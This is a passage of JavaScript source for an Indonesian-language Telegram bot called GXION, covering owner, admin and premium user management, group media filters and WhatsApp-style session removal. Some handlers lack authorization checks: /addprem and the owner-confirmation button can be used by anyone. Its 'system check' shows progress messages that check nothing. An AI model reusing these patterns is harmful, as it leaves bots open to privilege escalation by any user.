    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉  - 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 ☊
━━━━━━━━━━━━━━━━
⸙ 𝙧𝙚𝙥𝙡𝙖𝙮 𝙥𝙚𝙨𝙖𝙣 𝙪𝙨𝙚𝙧 𝙙𝙚𝙣𝙜𝙖𝙣 /𝙖𝙙𝙙𝙤𝙬𝙣𝙚𝙧
⸙ 𝙠𝙚𝙩𝙞𝙠 /𝙖𝙙𝙙𝙤𝙬𝙣𝙚𝙧 11625282992 / 𝙞𝙙 𝙪𝙨𝙚𝙧 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙖𝙣𝙙𝙖 𝙖𝙙𝙙𝙤𝙬𝙣𝙚𝙧...
\`\`\`
`
    );
  }

  if (ownerUsers.includes(targetUserId)) {
    return ctx.reply(
`
\`\`\`js
𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙎𝙔𝙎𝙏𝙀𝙈 ߷
━━━━━━━━━━━━
⸙ 𝙨𝙪𝙙𝙖𝙝 𝙢𝙚𝙣𝙟𝙖𝙙𝙞 𝙤𝙬𝙣𝙚𝙧 𝙢𝙚𝙠𝙞...
⸙ 👤 𝙄𝘿: \`${targetUserId}\`
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  // Kirim konfirmasi tombol
  await ctx.reply(
`
\`\`\`js
𝙎𝙔𝙎𝙏𝙀𝙈 - 𝘾𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⸙
━━━━━━━━━━━━━━━━━━
⸙ 𝙖𝙥𝙖𝙠𝙖𝙝 𝙖𝙣𝙙𝙖 𝙮𝙖𝙠𝙞𝙣 𝙞𝙣𝙜𝙞𝙣 𝙢𝙚𝙣𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝙪𝙨𝙚𝙧 𝙢𝙚𝙣𝙟𝙖𝙙𝙞 𝙊𝙒𝙉𝙀𝙍 ?
⸙ 👤 𝙄𝘿: \`${targetUserId}\`
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ YES", callback_data: `confirm_addowner_${targetUserId}`, style: "success" },
            { text: "❌ NO", callback_data: `cancel_addowner`, style: "primary" }
          ]
        ]
      }
    }
  );
});


// ========== BUTTON YES ==========
bot.action(/confirm_addowner_(.+)/, async (ctx) => {
  const targetUserId = ctx.match[1];

  if (ownerUsers.includes(targetUserId)) {
    return ctx.answerCbQuery("Sudah jadi owner ❗");
  }

  ownerUsers.push(targetUserId);
  saveJSON(ownerFile, ownerUsers);

  await ctx.editMessageText(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙎𝙐𝘾𝘾𝙀𝙎𝙁𝙐𝙇𝙔 ᣲ
━━━━━━━━━━━━━━━━━━━━━━━━
⸙ 𝙤𝙬𝙣𝙚𝙧 𝙨𝙪𝙘𝙘𝙚𝙨 𝙙𝙞 𝙩𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣
⸙ 👤 𝙄𝘿: \`${targetUserId}\`
⸙ 𝙖𝙘𝙘𝙚𝙨 𝙡𝙚𝙗𝙞𝙝 𝙖𝙠𝙖𝙣 𝙙𝙞 𝙗𝙚𝙧𝙞𝙠𝙖𝙣 ⎙
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("𝘼𝙡𝙡 𝘾𝙤𝙣𝙛𝙞𝙧𝙢𝙖𝙩𝙞𝙤𝙣 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮⎌");
});


// ========== BUTTON NO ==========
bot.action("cancel_addowner", async (ctx) => {
  await ctx.editMessageText(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙀𝙍𝙍𝙊𝙍
━━━━━━━━━━━
⸙ 𝙥𝙚𝙣𝙖𝙢𝙗𝙖𝙝𝙖𝙣 𝙤𝙬𝙣𝙚𝙧 𝙖𝙘𝙘𝙚𝙨 𝙙𝙞 𝙗𝙖𝙩𝙖𝙡𝙠𝙖𝙣 ⎋
⸙ 𝙮𝙖𝙝𝙖𝙝𝙖 𝙢𝙖𝙢𝙥𝙪𝙨 𝙜𝙖𝙟𝙖𝙙𝙞 𝙙𝙞 𝙖𝙙𝙙𝙤𝙬𝙣𝙚𝙧 𝙠𝙞𝙬...
\`\`\`
`,
  { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("𝘾𝙖𝙣𝙣𝙘𝙚𝙡𝙚𝙙 𝘼𝙡𝙡 𝘾𝙤𝙣𝙛𝙞𝙧𝙢𝙖𝙩𝙞𝙤𝙣 ⍨");
});
// ========== COMMAND /delowner (ITALIC STYLE) ==========
bot.command("delowner", checkOwner, async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉  - 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 ☊
━━━━━━━━━━━━━━━━
⸙ 𝙧𝙚𝙥𝙡𝙮 𝙥𝙚𝙨𝙖𝙣 𝙪𝙨𝙚𝙧 𝙙𝙚𝙣𝙜𝙖𝙣 /delowner
⸙ 𝙠𝙚𝙩𝙞𝙠 /delowner 123456789
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  if (!ownerUsers.includes(targetUserId)) {
    return ctx.reply(
`
\`\`\`js
𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙎𝙔𝙎𝙏𝙀𝙈 ߷
━━━━━━━━━━━━
⸙ 𝙪𝙨𝙚𝙧 𝙗𝙪𝙠𝙖𝙣 𝙤𝙬𝙣𝙚𝙧
⸙ 👤 𝙄𝘿: \`${targetUserId}\`
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  // KONFIRMASI
  await ctx.reply(
`
\`\`\`js
𝙎𝙔𝙎𝙏𝙀𝙈 - 𝘾𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⸙
━━━━━━━━━━━━━━━━━━
⸙ 𝙮𝙖𝙠𝙞𝙣 𝙞𝙣𝙜𝙞𝙣 𝙢𝙚𝙣𝙜𝙝𝙖𝙥𝙪𝙨 𝙤𝙬𝙣𝙚𝙧 ?
⸙ 👤 𝙄𝘿: \`${targetUserId}\`
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ YES", callback_data: `confirm_delowner_${targetUserId}` },
            { text: "❌ NO", callback_data: `cancel_delowner` }
          ]
        ]
      }
    }
  );
});


// ========== YES ==========
bot.action(/confirm_delowner_(.+)/, async (ctx) => {
  const targetUserId = ctx.match[1];

  if (!ownerUsers.includes(targetUserId)) {
    return ctx.answerCbQuery("Bukan owner ❗");
  }

  ownerUsers = ownerUsers.filter(id => id !== targetUserId);
  saveJSON(ownerFile, ownerUsers);

  await ctx.editMessageText(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙎𝙐𝘾𝘾𝙀𝙎𝙎 ⚡
━━━━━━━━━━━━━━━━━━━━
⸙ 𝙤𝙬𝙣𝙚𝙧 𝙗𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙙𝙞𝙝𝙖𝙥𝙪𝙨
⸙ 👤 𝙄𝘿: \`${targetUserId}\`
⸙ 𝙖𝙘𝙘𝙚𝙨 𝙙𝙞𝙘𝙖𝙗𝙪𝙩 ⎋
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("𝘼𝙠𝙨𝙚𝙨 𝙊𝙬𝙣𝙚𝙧 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝘿𝙞 𝘾𝙖𝙗𝙪𝙩 ⎙");
});


// ========== NO ==========
bot.action("cancel_delowner", async (ctx) => {
  await ctx.editMessageText(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝘾𝘼𝙉𝘾𝙀𝙇 ⎋
━━━━━━━━━━━━━━━
⸙ 𝙥𝙧𝙤𝙨𝙚𝙨 𝙙𝙞𝙗𝙖𝙩𝙖𝙡𝙠𝙖𝙣
⸙ 𝙤𝙬𝙣𝙚𝙧 𝙩𝙞𝙙𝙖𝙠 𝙙𝙞𝙝𝙖𝙥𝙪𝙨
\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  ctx.answerCbQuery("𝘾𝙖𝙣𝙘𝙚𝙡𝙚𝙙 ❌");
});
// ========== COMMAND /addadmin (TAMPILAN KEREN & NO ERROR) ==========
bot.command("addadmin", checkOwner, async (ctx) => {
  let targetUserId;

  // Cek apakah reply ke pesan user
  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
      "👑 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n" +
      "┇ *✨ CARA PAKAI ADDADMIN* ✨\n" +
      "┇ \n" +
      "┇ 📌 *Contoh:*\n" +
      "┇ `/addadmin 1113570863`\n" +
      "┇ \n" +
      "┇ 📌 *Atau reply pesan user:*\n" +
      "┇ Ketik `/addadmin` sambil reply\n" +
      "👑 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*",
      { parse_mode: "Markdown" }
    );
  }

  if (adminList.includes(targetUserId)) {
    return ctx.reply(
      `👑 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇ ⚠️ *SUDAH ADMIN* ⚠️\n` +
      `┇ \n` +
      `┇ 👤 User ID: \`${targetUserId}\`\n` +
      `┇ 📌 Sudah memiliki akses admin.\n` +
      `👑 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
      { parse_mode: "Markdown" }
    );
  }

  // Tambahkan admin
  addAdmin(targetUserId);

  // Tampilan sukses yang keren
  await ctx.reply(
    `🎉 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   👑 *ADMIN BERHASIL DITAMBAHKAN* 👑\n` +
    `┇\n` +
    `┇ 👤 *User ID:* \`${targetUserId}\`\n` +
    `┇\n` +
    `┇ 🎉 Selamat! User sekarang memiliki\n` +
    `┇    akses penuh sebagai admin!\n` +
    `┇\n` +
    `┇ 📌 Akses: *Semua command admin*\n` +
    `🎉 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*\n` +
    `\n_✨ User dapat menggunakan semua fitur admin sekarang!_`,
    { parse_mode: "Markdown" }
  );
});

// ========== COMMAND /addprem (DENGAN TAMPILAN MENARIK) ==========
bot.command("addprem", async (ctx) => {
  let targetUserId;

  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
      "🪧 <b>Format:</b> <code>/addprem &lt;user_id&gt;</code> atau reply chat user",
      {
        parse_mode: "HTML"
      }
    );
  }

  if (premiumUsers.includes(targetUserId)) {
    return ctx.reply(
      `⚠️ <b>User</b> <code>${targetUserId}</code> sudah menjadi akses premium.`,
      {
        parse_mode: "HTML"
      }
    );
  }

  // simpan executor id
  const executorId = ctx.from.id.toString();

  // 🔥 UI + CATBOX + STYLE TETAP
  await ctx.replyWithPhoto(
    "https://gangalink.vercel.app/i/r1468jak.jpg", // ganti link catbox lu
    {
      caption:
`
<blockquote>
<b>╭──〔 PREMIUM ACCESS 〕──╮</b>
│  <tg-emoji emoji-id="4956461073550017373">🥷🏻</tg-emoji><b>Target ID :</b> <code>${targetUserId}</code>
│ <tg-emoji emoji-id="4958699241137505132">🟢</tg-emoji><b>Status :</b> WAITING SELECT
<b>╰────────────────────╯</b>

<i>Apakah target id sudah benar ?</i>
Jika benar pilih durasi premium.
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "30 HARI",
              callback_data: `prem_30_${targetUserId}_${executorId}`, 
              style: "success",
              icon_custom_emoji_id: "4956214413578207998"
            },
            {
              text: "90 HARI",
              callback_data: `prem_90_${targetUserId}_${executorId}`,
              style: "primary",
              icon_custom_emoji_id: "4956214413578207998"
            },
            {
              text: "120 HARI",
              callback_data: `prem_120_${targetUserId}_${executorId}`,
              style: "danger",
              icon_custom_emoji_id: "4956214413578207998"
            }
          ],
          [
            {
              text: "❌ CANCEL ACTION",
              callback_data: `prem_cancel_${executorId}`,
              style: "danger",
              icon_custom_emoji_id: "4956612582816351459"
            }
          ]
        ]
      }
    }
  );
});

// ========= ACTION =========
bot.action(/prem_.+/, async (ctx) => {
  const data = ctx.match[0];

  // ========= CANCEL =========
  if (data.startsWith("prem_cancel_")) {
    const executorId = data.split("_")[2];

    // hanya executor yang bisa cancel
    if (ctx.from.id.toString() !== executorId) {
      return ctx.answerCbQuery(
        "❌ Kamu bukan executor command ini!",
        { show_alert: true }
      );
    }

    await ctx.deleteMessage().catch(() => {});
    return;
  }

  const [_, duration, userId, executorId] = data.split("_");

  // ========= PROTECT BUTTON =========
  if (ctx.from.id.toString() !== executorId) {
    return ctx.answerCbQuery(
      "❌ Tombol ini bukan milik kamu!",
      { show_alert: true }
    );
  }

  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }

  // ambil username executor
  const executor =
    ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "Unknown";

  await ctx.editMessageCaption(
`
<blockquote>
<b>╭──〔 PREMIUM STATUS 〕──╮</b>
│ <tg-emoji emoji-id="4958610528588008305">✅</tg-emoji><b>Status :</b> ACTIVE
│ <tg-emoji emoji-id="4956461073550017373">🥷🏻</tg-emoji><b>User :</b> <code>${userId}</code>
│  <tg-emoji emoji-id="4956214413578207998">📝</tg-emoji><b>Duration :</b> ${duration} Hari
│ <tg-emoji emoji-id="5870619152829386951">👑</tg-emoji><b>Executor Added :</b> ${executor}
<b>╰────────────────────╯</b>
</blockquote>
`,
    {
      parse_mode: "HTML"
    }
  ).catch(() => {});
});
// ========== COMMAND /deladmin (TAMPILAN KEREN & NO ERROR) ==========
bot.command("deladmin", checkOwner, async (ctx) => {
  let targetUserId;

  // Cek apakah reply ke pesan user
  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
      "🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n" +
      "┇ *✨ CARA PAKAI DELADMIN* ✨\n" +
      "┇ \n" +
      "┇ 📌 *Contoh:*\n" +
      "┇ `/deladmin 1113570863`\n" +
      "┇ \n" +
      "┇ 📌 *Atau reply pesan user:*\n" +
      "┇ Ketik `/deladmin` sambil reply\n" +
      "🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*",
      { parse_mode: "Markdown" }
    );
  }

  // Cek apakah user ada di daftar admin
  if (!adminList.includes(targetUserId)) {
    return ctx.reply(
      `⚠️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇ ❌ *BUKAN ADMIN* ❌\n` +
      `┇ \n` +
      `┇ 👤 User ID: \`${targetUserId}\`\n` +
      `┇ 📌 User ini tidak terdaftar sebagai admin.\n` +
      `⚠️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
      { parse_mode: "Markdown" }
    );
  }

  // Hapus admin
  removeAdmin(targetUserId);

  // Tampilan sukses yang keren
  await ctx.reply(
    `🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   👑 *ADMIN BERHASIL DIHAPUS* 👑\n` +
    `┇\n` +
    `┇ 👤 *User ID:* \`${targetUserId}\`\n` +
    `┇\n` +
    `┇ 🚫 User sudah tidak memiliki\n` +
    `┇    akses admin lagi.\n` +
    `┇\n` +
    `┇ 📌 Akses admin telah dicabut.\n` +
    `🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*\n` +
    `\n_✨ User sekarang menjadi user biasa._`,
    { parse_mode: "Markdown" }
  );
});

// ========== COMMAND /delprem (FIX NO ERROR & CLEAN) ==========
bot.command("delprem", checkAdmin, async (ctx) => {
  let targetUserId;

  // Ambil target dari reply atau args
  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  // Jika tidak ada target
  if (!targetUserId) {
    return ctx.reply(
`
\`\`\`js
💎 ┏━━━━━━━━━━━━━━━━━━━━━━┓
✨  CARA PAKAI COMMAND DELPREMIUM
━━━━━━━━━━━━━━━━━━━━━━━
📌 Contoh:
/delprem 1113570863

📌 Atau reply user:
/delprem (reply pesan)
💎 ┗━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  // Jika bukan premium
  if (!premiumUsers.includes(targetUserId)) {
    return ctx.reply(
`
\`\`\`js
⚠️ ┏━━━━━━━━━━━━━━━━━━┓
❌ USER BUKAN PREMIUM
━━━━━━━━━━━━━━━━━━━
👤 ID: \`${targetUserId}\`

User ini tidak terdaftar premium sebagai
akses premium !
⚠️ ┗━━━━━━━━━━━━━━━━━━┛
\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }

  // Hapus dari premium
  premiumUsers = premiumUsers.filter(id => id !== targetUserId);
  saveJSON(premiumFile, premiumUsers);

  // Sukses hapus
  await ctx.reply(
`
\`\`\`js
💎 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
✨  PREMIUM BERHASIL DIHAPUS
━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 ID: \`${targetUserId}\`

🚫 Akses premium dicabut
📌 Sekarang user tidak memiliki akses
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\`
`,
    { parse_mode: "Markdown" }
  );
});

// ========== COMMAND /list (ULTRA KECE) ==========
bot.command("list", checkAdmin, async (ctx) => {
  await ctx.reply(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙇𝙄𝙎𝙏 𝙐𝙎𝙀𝙍 𝘼𝘾𝘾𝙀𝙎𝙎 ☊
━━━━━━━━━━━━━━━━━━
⸙ 𝙥𝙞𝙡𝙞𝙝 𝙙𝙖𝙩𝙖 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙡𝙞𝙝𝙖𝙩...
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💎 PREMIUM ACCES", callback_data: "show_premium", style: "primary" },
            { text: "👑 ADMIN ACCES", callback_data: "show_admin", style: "success" }
          ],
          [
            { text: "🔥 OWNER ACCES", callback_data: "show_owner", style: "danger" }
          ]
        ]
      }
    }
  );
});


// ========== PREMIUM ==========
bot.action("show_premium", async (ctx) => {
  if (premiumUsers.length === 0) {
    return ctx.editMessageText(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙪𝙨𝙚𝙧 𝙥𝙧𝙚𝙢𝙞𝙪𝙢
\`\`\`
`,
      backBtn()
    );
  }

  let text = premiumUsers
    .map((id, i) => `⸙ ${i + 1}. \`${id}\``)
    .join("\n");

  await ctx.editMessageText(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 ☊
━━━━━━━━━━━━━━━━━━
${text}

⸙ 𝙩𝙤𝙩𝙖𝙡 𝙥𝙧𝙚𝙢𝙞𝙪𝙢: ${premiumUsers.length}
\`\`\`
`,
    backBtn()
  );
});


// ========== ADMIN ==========
bot.action("show_admin", async (ctx) => {
  if (adminList.length === 0) {
    return ctx.editMessageText(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙇𝙄𝙎𝙏 𝘼𝘿𝙈𝙄𝙉 𝘼𝘾𝘾𝙀𝙎𝙎 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙖𝙙𝙢𝙞𝙣
\`\`\`
`,
      backBtn()
    );
  }

  let text = adminList
    .map((id, i) => `⸙ ${i + 1}. \`${id}\``)
    .join("\n");

  await ctx.editMessageText(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝘼𝘿𝙈𝙄𝙉 ☊
━━━━━━━━━━━━━━━━━━
${text}

⸙ 𝙩𝙤𝙩𝙖𝙡: ${adminList.length}
\`\`\`
`,
    backBtn()
  );
});


// ========== OWNER ==========
bot.action("show_owner", async (ctx) => {
  if (ownerUsers.length === 0) {
    return ctx.editMessageText(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙊𝙒𝙉𝙀𝙍 ⚠️
━━━━━━━━━━━━━━━━━━
⸙ 𝙗𝙚𝙡𝙪𝙢 𝙖𝙙𝙖 𝙤𝙬𝙣𝙚𝙧
\`\`\`
`,
      backBtn()
    );
  }

  let text = ownerUsers
    .map((id, i) => `⸙ ${i + 1}. \`${id}\``)
    .join("\n");

  await ctx.editMessageText(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙊𝙒𝙉𝙀𝙍 👑
━━━━━━━━━━━━━━━━━━
${text}

⸙ 𝙩𝙤𝙩𝙖𝙡: ${ownerUsers.length}
\`\`\`
`,
    backBtn()
  );
});


// ========== BACK ==========
bot.action("list_back", async (ctx) => {
  await ctx.editMessageText(
`
\`\`\`js
𝙂𝙓𝙄𝙊𝙉 - 𝙇𝙄𝙎𝙏 𝙐𝙎𝙀𝙍 𝘼𝘾𝘾𝙀𝙎𝙎 ☊
━━━━━━━━━━━━━━━━━━
⸙ 𝙥𝙞𝙡𝙞𝙝 𝙙𝙖𝙩𝙖 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙡𝙞𝙝𝙖𝙩...
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💎 PREMIUM ACCES", callback_data: "show_premium", style: "primary" },
            { text: "👑 ADMIN ACCES", callback_data: "show_admin", style: "success" }
          ],
          [
            { text: "🔥 OWNER ACCES", callback_data: "show_owner", style: "danger" }
          ]
        ]
      }
    }
  );
});


// ========== BUTTON TEMPLATE ==========
function backBtn() {
  return {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "◀️ BACK", callback_data: "list_back", style: "danger" }]
      ]
    }
  };
}

const startTime = Date.now();

bot.command("cekbot", async (ctx) => {
  try {
    const msg = await ctx.reply("🔄 initializing...");

    const steps = [
      "10% ⟩ checking panel...",
      "20% ⟩ loading cpu...",
      "30% ⟩ validating system...",
      "40% ⟩ checking connection...",
      "50% ⟩ syncing data...",
      "60% ⟩ scanning modules...",
      "70% ⟩ verifying security...",
      "80% ⟩ optimizing response...",
      "90% ⟩ finalizing...",
      "100% ⟩ completed ✔"
    ];

    for (let step of steps) {
      await new Promise(r => setTimeout(r, 350));

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        msg.message_id,
        null,
        `🤖 <b>GXION SYSTEM CHECK</b>\n\n${step}`,
        { parse_mode: "HTML" }
      );
    }

    // uptime
    const uptime = Date.now() - startTime;

    const d = Math.floor(uptime / (1000 * 60 * 60 * 24));
    const h = Math.floor((uptime / (1000 * 60 * 60)) % 24);
    const m = Math.floor((uptime / (1000 * 60)) % 60);
    const s = Math.floor((uptime / 1000) % 60);

    const uptimeFormat = `${d}d ${h}h ${m}m ${s}s`;

    // ping
    const ping = Date.now() - (ctx.message.date * 1000);

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote>
🤖 <b>INFORMATION RUNNING</b>
━━━━━━━━━━━━━━━
┃ ⚡ Status : <b>ONLINE</b>
┃ ⏱️ Uptime : <code>${uptimeFormat}</code>
┃ 📡 Ping   : <code>${ping} ms</code>
┗━━━━━━━━━━━━━━━
</blockquote>
`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.log("TERJADI ERROR APDS COMMAND /cekbot:", err);
  }
});

bot.command("antivideo", async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Hanya bisa di group");
    }

    const chatId = ctx.chat.id.toString();

    
    const member = await ctx.getChatMember(ctx.from.id);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args) {
      return ctx.reply("📌 Format: /antivideo on /off");
    }

  
    if (args === "on") {
      if (!antiVideoGroups.includes(chatId)) {
        antiVideoGroups.push(chatId);
        saveAntiVideo(antiVideoGroups);
      }
      return ctx.reply("✅ Anti video aktif di grup ini");
    }

   
    if (args === "off") {
      antiVideoGroups = antiVideoGroups.filter(id => id !== chatId);
      saveAntiVideo(antiVideoGroups);
      return ctx.reply("❌ Anti video dimatikan");
    }

    return ctx.reply("📌 Gunakan: /antivideo on /off");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.on("video", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiVideoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim video di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})


bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Hanya bisa di group")
  }

  
  const member = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini")
  }

  const args = ctx.message.text.split(" ")[1]
  if (!args) return ctx.reply("📌 Format: /antifoto on /off")

  const chatId = ctx.chat.id.toString()

  if (args === "on") {
    if (!antiFotoGroups.includes(chatId)) {
      antiFotoGroups.push(chatId)
      saveAntiFoto(antiFotoGroups)
    }
    return ctx.reply("✅ Anti foto aktif di grup ini")
  }

  if (args === "off") {
    antiFotoGroups = antiFotoGroups.filter(id => id !== chatId)
    saveAntiFoto(antiFotoGroups)
    return ctx.reply("❌ Anti foto dimatikan")
  }

  ctx.reply("📌 Gunakan: /antifoto on /off")
})

bot.on("photo", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiFotoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim foto di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("groupon", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("on");
  ctx.reply("👥 Group Only berhasil diaktifkan.");
});

bot.command("groupoff", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("off");
  ctx.reply("🌍 Group Only dimatikan.");
});

bot.command("mode", (ctx) => {
  ctx.reply(`⚙️ Mode saat ini: ${getMode().toUpperCase()}`);
});

bot.command("self", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("self");
  ctx.reply("🔒 Bot Di kunci Owner.");
});

bot.command("public", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("public");
  ctx.reply("🔓 Bot di buka oleh Owner.");
});

bot.command("delpair", async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;

  if (!isOwner(userId)) {
    return ctx.reply(
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("⚠️ Contoh: /delpair 628xxxx");
  }

  const botNumber = args[1].replace(/[^0-9]/g, "");

  let statusMessage = await ctx.reply(
`\`\`\`js
𝙂𝙓𝙄𝙊𝙉 — 𝙇𝙊𝘼𝘿𝙄𝙉𝙂
ID: ${botNumber}
Status: Executing...\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);

    // 🔥 FIX UTAMA (ANTI BOT ZOMBIE)
    if (sock) {
      try {
        await sock.logout();
      } catch (e) {}

      try {
        sock.end?.();         // matiin koneksi
        sock.ws?.close?.();   // force close websocket
      } catch (e) {}

      sessions.delete(botNumber);
    }

    // 🔥 HAPUS FOLDER SESSION
    const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }

    // 🔥 UPDATE FILE SESSION
    if (fs.existsSync(SESSIONS_FILE)) {
